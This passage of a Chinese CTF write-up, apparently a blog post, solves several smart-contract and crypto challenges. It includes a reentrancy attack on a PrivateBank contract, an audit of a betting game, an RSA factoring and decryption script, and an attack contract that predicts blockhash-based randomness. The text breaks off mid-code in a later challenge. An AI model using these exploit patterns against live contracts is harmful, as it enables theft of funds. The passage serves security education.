href=\"#PrivateBank-sol\" class=\"headerlink\" title=\"PrivateBank.sol\"></a>PrivateBank.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.15;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivateBank &#123;</span><br><span class=\"line\">    mapping (address =&gt; uint) userBalance;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function getBalance(address u) constant returns(uint)&#123;</span><br><span class=\"line\">        return userBalance[u];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function addToBalance() payable&#123;</span><br><span class=\"line\">        userBalance[msg.sender] += msg.value;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\"></span><br><span class=\"line\">    function withdrawBalance()&#123;</span><br><span class=\"line\">        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) )&#123;</span><br><span class=\"line\">            throw;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        userBalance[msg.sender] = 0;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看名字都猜出来了，肯定是重入漏洞啦<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msg.sender.call.value(userBalance[msg.sender])()</span><br></pre></td></tr></table></figure></p>\n<p>攻击的话call一下就好了hhh。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">先让攻击合约充一点钱</span><br><span class=\"line\">function () payable public&#123;</span><br><span class=\"line\">    victim.call(bytes4(keccak256(&quot;withdrawBalance()&quot;)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Q4-游戏逻辑题，找出三个漏洞\"><a href=\"#Q4-游戏逻辑题，找出三个漏洞\" class=\"headerlink\" title=\"Q4 - 游戏逻辑题，找出三个漏洞\"></a>Q4 - 游戏逻辑题，找出三个漏洞</h3><p>这个题最后只有我们天枢给出了主办方满意的回答，已经在赛后分享和大家讨论过了。</p>\n<p>也是之前在创宇404的时候，和Lorexxar’师傅经常一起审合约，养成的好习惯。很喜欢这道题，出题的师傅说，请大家把它仅仅当作游戏合约来看待，而不是蜜罐之类的hh。我还蛮喜欢这种心态的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// Bet Game</span><br><span class=\"line\">contract BetGame &#123;</span><br><span class=\"line\">\taddress owner;\t\t\t\t\t                // 合约持有者</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public balanceOf;\t// 用户资金集</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tuint256 public cutOffBlockNumber;\t\t        // 下注截止到cutOffBlockNumber,至少有1000个块的距离到创建合约的块</span><br><span class=\"line\">\tuint256 public status; \t\t\t\t            // 状态，根据每次下注修改状态</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public positiveSet;\t// 赌注正面赢: status == 1</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public negativeSet;\t// 赌注反面赢: status == 0</span><br><span class=\"line\">\tuint256 public positiveBalance;\t\t\t        // 正面下注资金总额</span><br><span class=\"line\">\tuint256 public negativeBalance;\t\t\t        // 反面下注资金总额</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isOwner &#123;</span><br><span class=\"line\">\t\tassert(owner == msg.sender);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isRunning &#123;</span><br><span class=\"line\">\t\tassert(block.number &lt; cutOffBlockNumber);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isStop &#123;</span><br><span class=\"line\">\t\tassert(block.number &gt;= cutOffBlockNumber);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tconstructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;\t\t\t</span><br><span class=\"line\">\t\tbalanceOf[owner] = 100000000000;</span><br><span class=\"line\">        cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class=\"line\">    \trequire(balanceOf[msg.sender] &gt;= value);</span><br><span class=\"line\">    \trequire(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class=\"line\">    \tbalanceOf[msg.sender] -= value;</span><br><span class=\"line\">    \tbalanceOf[to] += value;</span><br><span class=\"line\">    \treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 下注并影响状态，该操作必须在赌局结束之前</span><br><span class=\"line\">\tfunction bet(uint256 value, bool positive) isRunning public returns(bool success) &#123;</span><br><span class=\"line\">\t\trequire(balanceOf[msg.sender] &gt;= value);</span><br><span class=\"line\">\t\tbalanceOf[msg.sender] -= value;</span><br><span class=\"line\">\t\tif (positive == true) &#123;</span><br><span class=\"line\">\t\t\tpositiveSet[msg.sender] += value;</span><br><span class=\"line\">\t\t\tpositiveBalance += value;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tnegativeSet[msg.sender] += value;</span><br><span class=\"line\">\t\t\tnegativeBalance += value;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br><span class=\"line\">\t\tuint8 flags = (uint8)(result &amp; 0xFF);\t// 取一个字节，根据值的大小决定状态</span><br><span class=\"line\">\t\tif (flags &gt; 128) &#123;</span><br><span class=\"line\">\t\t\tstatus = 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tstatus = 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 猜对就取回成本和猜对所得（猜错将不能取回成本），该操作必须在赌局结束以后</span><br><span class=\"line\">\tfunction withdraw() isStop public returns (bool success)&#123;</span><br><span class=\"line\">\t\tuint256 betBalance;</span><br><span class=\"line\">\t\tuint256 reward;</span><br><span class=\"line\">\t\tif (status == 1) &#123; // positiveSet</span><br><span class=\"line\">\t\t\tbetBalance = positiveSet[msg.sender];</span><br><span class=\"line\">\t\t\tif (betBalance &gt; 0) &#123;</span><br><span class=\"line\">\t\t\t    balanceOf[msg.sender] += betBalance;</span><br><span class=\"line\">\t\t\t\tpositiveSet[msg.sender] -= betBalance;</span><br><span class=\"line\">\t\t\t\tpositiveBalance -= betBalance;</span><br><span class=\"line\">\t\t\t\treward = (betBalance * negativeBalance) / positiveBalance;</span><br><span class=\"line\">\t\t\t\tnegativeBalance -= reward;</span><br><span class=\"line\">\t\t\t\tbalanceOf[msg.sender] += reward;</span><br><span class=\"line\">\t\t\t&#125; </span><br><span class=\"line\">\t\t&#125; else if (status == 0) &#123;</span><br><span class=\"line\">\t\t\tbetBalance = negativeSet[msg.sender];</span><br><span class=\"line\">\t\t\tif (betBalance &gt; 0) &#123;</span><br><span class=\"line\">\t\t\t    balanceOf[msg.sender] += betBalance;</span><br><span class=\"line\">\t\t\t\tnegativeSet[msg.sender] -= betBalance;</span><br><span class=\"line\">\t\t\t\tnegativeBalance -= betBalance;</span><br><span class=\"line\">\t\t\t\treward = (betBalance * positiveBalance) / negativeBalance;</span><br><span class=\"line\">\t\t\t\tpositiveBalance -= reward;</span><br><span class=\"line\">\t\t\t\tbalanceOf[msg.sender] += reward;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>不按审合约正确的套路写了，这里给出我的答案，前三个是师傅的预期解。</p>\n<h4 id=\"随机数分布不均\"><a href=\"#随机数分布不均\" class=\"headerlink\" title=\"随机数分布不均\"></a>随机数分布不均</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (flags &gt; 128) &#123;</span><br><span class=\"line\">    status = 1;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    status = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正:反 = 129:127</p>\n<h4 id=\"发奖金时逻辑有误\"><a href=\"#发奖金时逻辑有误\" class=\"headerlink\" title=\"发奖金时逻辑有误\"></a>发奖金时逻辑有误</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">negativeSet[msg.sender] -= betBalance;</span><br><span class=\"line\">negativeBalance -= betBalance;</span><br><span class=\"line\">reward = (betBalance * positiveBalance) / negativeBalance;</span><br></pre></td></tr></table></figure>\n<p>应该先计算reward，再变动参数，目前这样会导致用户多领款。</p>\n<h4 id=\"游戏时长设计不合理\"><a href=\"#游戏时长设计不合理\" class=\"headerlink\" title=\"游戏时长设计不合理\"></a>游戏时长设计不合理</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier isRunning &#123;</span><br><span class=\"line\">    assert(block.number &lt; cutOffBlockNumber);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier isStop &#123;</span><br><span class=\"line\">    assert(block.number &gt;= cutOffBlockNumber);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">constructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class=\"line\">    owner = msg.sender;\t\t\t</span><br><span class=\"line\">    balanceOf[owner] = 100000000000;</span><br><span class=\"line\">    cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require(游戏长度&gt; 1000 and 游戏长度&lt;10000);</span><br><span class=\"line\">cutOffBlockNumber = block.number + 游戏长度;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"随机数的熵源\"><a href=\"#随机数的熵源\" class=\"headerlink\" title=\"随机数的熵源\"></a>随机数的熵源</h4><p>虽然没有较完美的随机数生成方案，但这里有个大问题hh<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br></pre></td></tr></table></figure></p>\n<p>区块未生成的情况下，<code>blockhash(block.number)</code>恒为0，借secbit的师傅的话：</p>\n<blockquote>\n<p>常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行 block.blockhash(block.number) 返回值为 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。</p>\n</blockquote>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><ul>\n<li>solidity版本过低</li>\n<li>上个safemath库，不过这个合约上下溢处理的都ok</li>\n</ul>\n<h3 id=\"Q11-密码学RSA\"><a href=\"#Q11-密码学RSA\" class=\"headerlink\" title=\"Q11 - 密码学RSA\"></a>Q11 - 密码学RSA</h3><p>这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！</p>\n<p>明文:<code>something_for_nothing</code></p>\n<p>思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。</p>\n<p>因为n1，n2高位相同，假设:</p>\n<ul>\n<li>n1 = p1 * q1</li>\n<li>n2 = (p1 + a) * (q1 + b)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">from gmpy2 import is_prime as prime</span><br><span class=\"line\">from gmpy2 import iroot</span><br><span class=\"line\">n = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class=\"line\">nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span><br><span class=\"line\"># print nn &gt; n</span><br><span class=\"line\">t = nn - n</span><br><span class=\"line\"></span><br><span class=\"line\">def f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y</span><br><span class=\"line\"></span><br><span class=\"line\">def f2(x, y, s): return (t - x * y - s) / (2 * x)</span><br><span class=\"line\"></span><br><span class=\"line\">for x in xrange(366, 3000):</span><br><span class=\"line\">    for y in xrange(1, 3000):</span><br><span class=\"line\">        print x, y</span><br><span class=\"line\">        if f1(x, y) &gt;= 0:</span><br><span class=\"line\">            s, b = iroot(f1(x, y), 2)</span><br><span class=\"line\">            if b:</span><br><span class=\"line\">                if prime(f2(x, y, int(s))):</span><br><span class=\"line\">                    print &quot;Success&quot;</span><br><span class=\"line\">                    print f2(x, y, int(s))</span><br><span class=\"line\">                    exit()</span><br></pre></td></tr></table></figure>\n<p>之后RSA解密即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def egcd(a, b):</span><br><span class=\"line\">    if a == 0:</span><br><span class=\"line\">        return (b, 0, 1)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        g, y, x = egcd(b % a, a)</span><br><span class=\"line\">        return (g, x - (b // a) * y, y)</span><br><span class=\"line\">def modinv(a, m):</span><br><span class=\"line\">    g, x, y = egcd(a, m)</span><br><span class=\"line\">    if g != 1:</span><br><span class=\"line\">        raise Exception(&apos;modular inverse does not exist&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return x % m</span><br><span class=\"line\"></span><br><span class=\"line\">def bytes_to_num(b):</span><br><span class=\"line\">    return int(b.encode(&apos;hex&apos;), 16)</span><br><span class=\"line\"></span><br><span class=\"line\">def num_to_bytes(n):</span><br><span class=\"line\">    b = hex(n)[2:-1]</span><br><span class=\"line\">    b = &apos;0&apos; + b if len(b)%2 == 1 else b #16进制补成偶数位</span><br><span class=\"line\">    return b.decode(&apos;hex&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">def gcd(a, b):</span><br><span class=\"line\">    if a &lt; b:</span><br><span class=\"line\">        a, b = b, a</span><br><span class=\"line\">    while b != 0:</span><br><span class=\"line\">        temp = a % b</span><br><span class=\"line\">        a = b</span><br><span class=\"line\">        b = temp</span><br><span class=\"line\">    return a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n= 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class=\"line\">q = 153346707022470063255234682736500792074659843501367018551890586572000593877733769700626279692600930780783180304304442159621776245608196861201940418144595471936294352073422843950321344403965643436262621305985924339820909114418402737553700882775797335050564405239123363288904724634792579573240467129306394648627</span><br><span class=\"line\">p = 155294691991478076246533723107402680119846505071987471714029291163531622103148666018845728574257526241116901720654471382085147320775795052977889980257647661071362112907870430296641453839932096411043572129394525643559799347739002453989935199062302896371462733787830466546655020686256703190391276771066251117813</span><br><span class=\"line\">c = 18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L </span><br><span class=\"line\">e = 65537</span><br><span class=\"line\">print p*q == n</span><br><span class=\"line\">d = modinv(e,(p-1)*(q-1))</span><br><span class=\"line\">print &quot;d: &quot; + str(d)</span><br><span class=\"line\">m = pow(c,d,p*q)</span><br><span class=\"line\">print &quot;m: &quot; + str(m)</span><br><span class=\"line\">flag = hex(m)</span><br><span class=\"line\">print str(flag)[2:-1].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Q14-puzzle-Hello\"><a href=\"#Q14-puzzle-Hello\" class=\"headerlink\" title=\"Q14 - puzzle Hello\"></a>Q14 - puzzle Hello</h3><p>长亭的晓航师傅技术厉害，出的题好，人还帅，我们队已经全员被圈粉了orz。</p>\n<p>这是一道考察与合约交互的基础题。只给了函数声明和合约地址，通过反复交互，获得提示，最后拿到flag，不是很难。我没怎么记住具体过程，不过只要是做合约审计方向的，应该都可以做出来。</p>\n<p>我这留了个邮件的记录，大佬们可以参考一下交互方式，其实两个合约可以合并，当时打得有点意识模糊。。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">随机数生成</span><br><span class=\"line\">pragma solidity ^0.4.19;</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    address public victim;</span><br><span class=\"line\">    uint256 public num;</span><br><span class=\"line\"></span><br><span class=\"line\">    function Attack() payable &#123; owner = msg.sender;</span><br><span class=\"line\">        victim = 0xc95872680072f57485aa0913ded224ee70a9e2cb;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\">    function sissel() public view returns(uint256)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">        return rand;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">交互，可能少了几个步骤，大体是这样</span><br><span class=\"line\">contract xixi &#123;</span><br><span class=\"line\">   </span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">   </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function getInfo() public pure returns(string);   </span><br><span class=\"line\">    function sendFlag1() public returns(string);</span><br><span class=\"line\">    function getCode() public pure returns(string);</span><br><span class=\"line\">    function game(uint256 guess) public view returns(string);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Q15-Puzzle-Magic-Bank\"><a href=\"#Q15-Puzzle-Magic-Bank\" class=\"headerlink\" title=\"Q15 - Puzzle Magic Bank\"></a>Q15 - Puzzle Magic Bank</h3><p>还是晓航师傅出的题，超有趣，我很喜欢这样不是很难，但是考点很多，而且每一步都理所应当的题目。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MagicBank &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balanceOf;</span><br><span class=\"line\">    mapping(address =&gt; uint) public creditOf;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transferBalance(address to, uint amount) public&#123;</span><br><span class=\"line\">        require(balanceOf[msg.sender] - amount &gt;= 0);</span><br><span class=\"line\">        balanceOf[msg.sender] -= amount;</span><br><span class=\"line\">        